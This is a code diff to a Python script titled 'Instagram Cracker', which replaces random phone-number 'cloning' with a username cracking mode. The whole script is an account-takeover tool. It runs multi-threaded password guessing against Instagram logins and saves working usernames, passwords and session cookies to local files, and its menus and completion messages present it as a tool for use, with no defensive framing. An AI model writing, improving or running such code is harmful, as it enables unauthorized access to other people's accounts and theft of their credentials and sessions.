@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Instagram Cracker - Enhanced Version
-Fixed and optimized with cloning functionality
+Fixed and optimized with username cracking functionality
 Author: BITHIKA
 Version: 2.0
 """
@@ -42,6 +42,8 @@ idz = []
 bkas = []
 Uuid = []
 xx = 0
+username_list = []
+password_list = []
 
 # Thread-safe locks
 counter_lock = threading.Lock()
@@ -58,15 +60,7 @@ def linex():
     """Print decorative line separator"""
     print(f"{WHITE}{'='*56}{RESET}")
 
-def generate_device_hash(uid, pw):
-    """Generate device hash for Instagram API"""
-    hash_obj = hashlib.md5()
-    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
-    hex_digest = hash_obj.hexdigest()
-    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
-    return hash_obj.hexdigest()
-
-def save_success(uid, pw):
+def save_success(uid, pw, cookies=None):
     """Thread-safe function to save successful login"""
     try:
         output_dir = "/sdcard/XYZ"
@@ -74,13 +68,16 @@ def save_success(uid, pw):
         
         try:
             os.makedirs(output_dir, exist_ok=True)
-            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
+            filepath = os.path.join(output_dir, "USERNAME_OK.txt")
         except (OSError, PermissionError):
             os.makedirs(fallback_dir, exist_ok=True)
-            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
+            filepath = os.path.join(fallback_dir, "USERNAME_OK.txt")
         
         with open(filepath, "a", encoding='utf-8') as f:
-            f.write(f"{uid}|{pw}\n")
+            if cookies:
+                f.write(f"{uid}|{pw}|{cookies}\n")
+            else:
+                f.write(f"{uid}|{pw}\n")
         
         with success_lock:
             if uid not in oks:
@@ -100,8 +97,8 @@ def get_fresh_csrf_token(session):
     except Exception as e:
         return None, None
 
-def crack(uid, password_list, total_count):
-    """Enhanced Instagram account cracking function"""
+def crack_username(uid, password_list, total_count):
+    """Enhanced Instagram username cracking function"""
     
     with counter_lock:
         global loop, bkas
@@ -197,7 +194,7 @@ def crack(uid, password_list, total_count):
                             with open("SUMON_INS_IDS.txt", "a") as f:
                                 f.write(f"{uid}|{pw}|{cookie_str}\n")
                     
-                    save_success(uid, pw)
+                    save_success(uid, pw, cookie_str)
                     
                     if len(bkas) % 2 == 0:
                         try:
@@ -255,50 +252,38 @@ def crack(uid, password_list, total_count):
     
     return False
 
-def generate_random_ids(limit):
-    """Generate random 6-digit IDs"""
-    idz.clear()
-    for _ in range(limit):
-        random_id = "".join(random.choice(string.digits) for _ in range(6))
-        idz.append(random_id)
-    return idz
-
-def get_password_patterns(uid):
-    """Generate password patterns based on UID"""
-    return [
-        uid[:6],
-        uid[:8],
-        uid,
-        '57273200',
-        'password',
-        '123456',
-    ]
-
-def random_number():
-    """Main random number cloning function"""
+def username_crack():
+    """Main username cracking function"""
     clear()
     
     print(f"{CYAN}{'='*56}{RESET}")
-    print(f"{CYAN}     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯{RESET}")
+    print(f"{CYAN}     🎯 INSTAGRAM USERNAME CRACKER 🎯{RESET}")
     print(f"{CYAN}{'='*56}{RESET}")
-    print(f" {WHITE}[{GREEN}•{WHITE}] Available Codes: {GREEN}7679, 7872, 9883, 8017{RESET}")
-    print(f" {WHITE}[{GREEN}•{WHITE}] Suggested Limits: {GREEN}1000, 2000, 5000, 10000{RESET}")
+    print(f" {WHITE}[{GREEN}•{WHITE}] Enter usernames to crack (comma separated){RESET}")
+    print(f" {WHITE}[{GREEN}•{WHITE}] Enter passwords to try (comma separated){RESET}")
     linex()
     
-    code = input(f" {WHITE}[{GREEN}?{WHITE}] Enter SIM Code: {GREEN}{RESET}").strip()
-    
-    try:
-        limit = int(input(f" {WHITE}[{GREEN}?{WHITE}] Enter Limit: {GREEN}{RESET}"))
-        if limit <= 0:
-            raise ValueError
-    except ValueError:
-        print(f" {RED}[!] Invalid limit. Using default: 99999{RESET}")
-        limit = 99999
+    # Get usernames
+    usernames_input = input(f" {WHITE}[{GREEN}?{WHITE}] Enter Usernames: {GREEN}{RESET}").strip()
+    if not usernames_input:
+        print(f" {RED}[!] No usernames entered!{RESET}")
         time.sleep(2)
+        return
     
-    print(f" {YELLOW}[*] Generating {limit} random IDs...{RESET}")
-    generate_random_ids(limit)
+    global username_list
+    username_list = [u.strip() for u in usernames_input.split(',') if u.strip()]
     
+    # Get passwords
+    passwords_input = input(f" {WHITE}[{GREEN}?{WHITE}] Enter Passwords: {GREEN}{RESET}").strip()
+    if not passwords_input:
+        print(f" {RED}[!] No passwords entered!{RESET}")
+        time.sleep(2)
+        return
+    
+    global password_list
+    password_list = [p.strip() for p in passwords_input.split(',') if p.strip()]
+    
+    # Reset global counters
     global loop, oks, cps
     with counter_lock:
         loop = 0
@@ -306,25 +291,26 @@ def random_number():
         oks.clear()
     cps.clear()
     
+    # Display start information
     clear()
     print(f"{CYAN}{'='*56}{RESET}")
-    print(f"{CYAN}     🔥 STARTING INSTAGRAM CLONING 🔥{RESET}")
+    print(f"{CYAN}     🔥 STARTING USERNAME CRACKING 🔥{RESET}")
     print(f"{CYAN}{'='*56}{RESET}")
-    print(f' {GREEN}(✓) {WHITE}Total IDs Generated: {GREEN}{len(idz):,}{RESET}')
-    print(f' {YELLOW}(+) {WHITE}SIM Code: {GREEN}{code}{RESET}')
-    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!{RESET}")
-    print(f' {YELLOW}[•] {WHITE}Results will be saved to: {GREEN}XYZ/RANDOM_OK.txt{RESET}')
+    print(f' {GREEN}(✓) {WHITE}Total Usernames: {GREEN}{len(username_list)}{RESET}')
+    print(f' {GREEN}(✓) {WHITE}Total Passwords: {GREEN}{len(password_list)}{RESET}')
+    print(f' {GREEN}(✓) {WHITE}Total Combinations: {GREEN}{len(username_list) * len(password_list)}{RESET}')
+    print(f' {YELLOW}[•] {WHITE}Results will be saved to: {GREEN}XYZ/USERNAME_OK.txt{RESET}')
     linex()
     
+    # Start multi-threaded attack
     start_time = time.time()
+    total_combinations = len(username_list) * len(password_list)
     
     with ThreadPoolExecutor(max_workers=15) as executor:
         futures = []
         
-        for random_id in idz:
-            uid = code + random_id
-            password_patterns = get_password_patterns(uid)
-            future = executor.submit(crack, uid, password_patterns, len(idz))
+        for uid in username_list:
+            future = executor.submit(crack_username, uid, password_list, total_combinations)
             futures.append(future)
         
         for future in as_completed(futures):
@@ -337,21 +323,25 @@ def random_number():
             except Exception as e:
                 print(f"\n{RED}[!] Task failed: {e}{RESET}")
     
+    # Calculate execution time
     end_time = time.time()
     execution_time = end_time - start_time
     
+    # Display results
     linex()
     print(f"{GREEN}{'='*56}{RESET}")
     print(f" {GREEN}[✓] PROCESS COMPLETED SUCCESSFULLY!{RESET}")
     print(f"{GREEN}{'='*56}{RESET}")
-    print(f" {WHITE}[📊] Total Accounts Tested: {GREEN}{len(idz):,}{RESET}")
+    print(f" {WHITE}[📊] Total Combinations Tested: {GREEN}{total_combinations}{RESET}")
     print(f" {WHITE}[✅] Successful Logins: {GREEN}{len(oks)}{RESET}")
     print(f" {WHITE}[❌] Failed Attempts: {RED}{len(cps)}{RESET}")
     print(f" {WHITE}[⏱️] Execution Time: {YELLOW}{execution_time:.2f} seconds{RESET}")
-    print(f" {WHITE}[🚀] Speed: {CYAN}{len(idz)/execution_time:.2f} IDs/second{RESET}")
     
     if len(oks) > 0:
         print(f" {GREEN}[🎉] SUCCESS! Found {len(oks)} working accounts!{RESET}")
+        print(f" {WHITE}[📝] Successful accounts:{RESET}")
+        for account in oks:
+            print(f"   {GREEN}→ {account}{RESET}")
     else:
         print(f" {RED}[😞] No successful logins found this time.{RESET}")
     
@@ -365,7 +355,7 @@ def menu():
         print(f"{CYAN}{'='*56}{RESET}")
         print(f"{CYAN}     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀{RESET}")
         print(f"{CYAN}{'='*56}{RESET}")
-        print(f" {WHITE}[{GREEN}1{WHITE}] 🎯 Random Number Cloning{RESET}")
+        print(f" {WHITE}[{GREEN}1{WHITE}] 🎯 Username Cracking{RESET}")
         print(f" {WHITE}[{GREEN}2{WHITE}] 📊 View Statistics{RESET}")
         print(f" {WHITE}[{GREEN}3{WHITE}] ❌ Exit Program{RESET}")
         print(f"{CYAN}{'='*60}{RESET}")
@@ -373,7 +363,7 @@ def menu():
         choice = input(f" {WHITE}[{GREEN}?{WHITE}] Select Option: {GREEN}{RESET}").strip()
         
         if choice == '1':
-            random_number()
+            username_crack()
         elif choice == '2':
             clear()
             print(f"{CYAN}{'='*56}{RESET}")
@@ -381,8 +371,9 @@ def menu():
             print(f"{CYAN}{'='*56}{RESET}")
             print(f" {WHITE}[✅] Total Successful: {GREEN}{len(oks)}{RESET}")
             print(f" {WHITE}[❌] Total Failed: {RED}{len(cps)}{RESET}")
-            print(f" {WHITE}[📝] Generated IDs: {YELLOW}{len(idz)}{RESET}")
-            print(f" {WHITE}[🔄] Current Progress: {CYAN}{loop}{RESET}")
+            print(f" {WHITE}[📝] Total Usernames: {YELLOW}{len(username_list)}{RESET}")
+            print(f" {WHITE}[🔑] Total Passwords: {YELLOW}{len(password_list)}{RESET}")
+            print(f" {WHITE}[🔄] Total Attempts: {CYAN}{loop}{RESET}")
             linex()
             input(f" {WHITE}[{RED}!{WHITE}] Press Enter to continue...{RESET}")
         elif choice == '3':
@@ -390,7 +381,7 @@ def menu():
             print(f"{GREEN}{'='*56}{RESET}")
             print(f" {GREEN}     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋{RESET}")
             print(f"{GREEN}{'='*56}{RESET}")
-            print(f" {YELLOW}[!] Results saved in: XYZ/RANDOM_OK.txt{RESET}")
+            print(f" {YELLOW}[!] Results saved in: XYZ/USERNAME_OK.txt{RESET}")
             print(f" {YELLOW}[!] Total successful accounts: {len(oks)}{RESET}")
             time.sleep(3)
             break
